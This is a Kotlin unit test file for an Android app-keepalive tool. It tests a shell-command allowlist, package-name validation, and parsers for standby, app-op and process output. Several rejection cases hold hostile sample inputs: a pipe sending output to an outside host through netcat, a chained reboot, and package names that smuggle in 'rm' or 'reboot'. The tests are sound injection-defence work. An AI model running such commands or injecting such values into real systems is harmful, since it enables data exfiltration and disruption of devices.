package app.xkeepalive.core

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class PolicyParsingTest {
    private val pkg = "com.example.game"

    @Test
    fun buildersAreAllowlistedAndInjectionIsRejected() {
        assertTrue(PolicyCommands.isAllowed(PolicyCommands.whitelistAdd(pkg)))
        assertTrue(PolicyCommands.isAllowed(PolicyCommands.whitelistRemove(pkg)))
        assertTrue(PolicyCommands.isAllowed(PolicyCommands.setStandby(pkg, "active")))
        assertTrue(PolicyCommands.isAllowed(PolicyCommands.setInactive(pkg, false)))
        assertTrue(PolicyCommands.isAllowed(PolicyCommands.setAppOp(pkg, "RUN_ANY_IN_BACKGROUND", "allow")))
        assertTrue(PolicyCommands.isAllowed(PolicyCommands.pidof(pkg)))
        assertTrue(PolicyCommands.isAllowed(PolicyCommands.psAll()))
        assertFalse(PolicyCommands.isAllowed("logcat -d -t 80 --pid=4321"))
        assertFalse(PolicyCommands.isAllowed("am set-standby-bucket $pkg active; reboot"))
        assertFalse(PolicyCommands.isAllowed("input tap 10 10"))
        assertFalse(PolicyCommands.isAllowed("am start -n $pkg/.Main"))
        assertFalse(PolicyCommands.isAllowed("pidof $pkg | toybox nc 1.2.3.4 9"))
    }

    @Test
    fun invalidPackageNeverBecomesACommand() {
        assertFalse(PackageNames.isValid("com.foo;rm"))
        assertFalse(PackageNames.isValid("not a package"))
        try {
            PolicyCommands.pidof("com.foo;reboot")
            throw AssertionError("expected failure")
        } catch (_: IllegalArgumentException) {
        }
    }

    @Test
    fun parsesStandbyInactiveWhitelistAndAppOps() {
        assertEquals("active", PolicyOutput.parseStandbyBucket("10"))
        assertEquals("exempted", PolicyOutput.parseStandbyBucket("5"))
        assertEquals("rare", PolicyOutput.parseStandbyBucket("standby bucket: rare"))
        assertEquals(false, PolicyOutput.parseInactive("Idle=false"))
        assertEquals(true, PolicyOutput.parseInactive("Idle=true"))
        val whitelist = "user,com.foo,10100\nuser,com.example.game,10321\n"
        assertTrue(PolicyOutput.whitelistContains(whitelist, pkg))
        assertFalse(PolicyOutput.whitelistContains(whitelist, "com.example"))
        assertEquals(
            "allow",
            PolicyOutput.appOpMode("RUN_ANY_IN_BACKGROUND: allow; time=1", "RUN_ANY_IN_BACKGROUND"),
        )
        assertEquals("ignore", PolicyOutput.appOpMode("Uid mode: ignore", "RUN_ANY_IN_BACKGROUND"))
        assertNull(PolicyOutput.appOpMode("No operations.", "RUN_IN_BACKGROUND"))
    }

    @Test
    fun exitPayloadAndProcessListStayNarrow() {
        val (code, output) = PolicyOutput.parseExitPayload("0\nhello\nworld")
        assertEquals(0, code)
        assertEquals("hello\nworld", output)
        val ps = """
            USER           PID  PPID NAME
            u0_a312       9894  1234 com.example.game
            u0_a312      10002  9894 com.example.game:push
            u0_a200       2222  1000 com.example.other
        """.trimIndent()
        assertEquals(setOf(9894, 10002), PolicyOutput.parseProcessPids(ps, pkg))
        assertEquals(setOf(2222), PolicyOutput.parseProcessPids(ps, "com.example.other"))
    }

    @Test
    fun verdictMatrix() {
        assertEquals(ProcessOutcome.STILL_IN_MEMORY, ProcessVerdict.compare(setOf(1), setOf(1, 2)))
        assertEquals(ProcessOutcome.TERMINATED, ProcessVerdict.compare(setOf(1), emptySet()))
        assertEquals(ProcessOutcome.RESTARTED_NEW_PID, ProcessVerdict.compare(setOf(1), setOf(2)))
        assertEquals(ProcessOutcome.NOT_RUNNING, ProcessVerdict.compare(emptySet(), emptySet()))
        assertEquals(ProcessOutcome.STILL_IN_MEMORY, ProcessVerdict.compare(emptySet(), setOf(4)))
    }
}
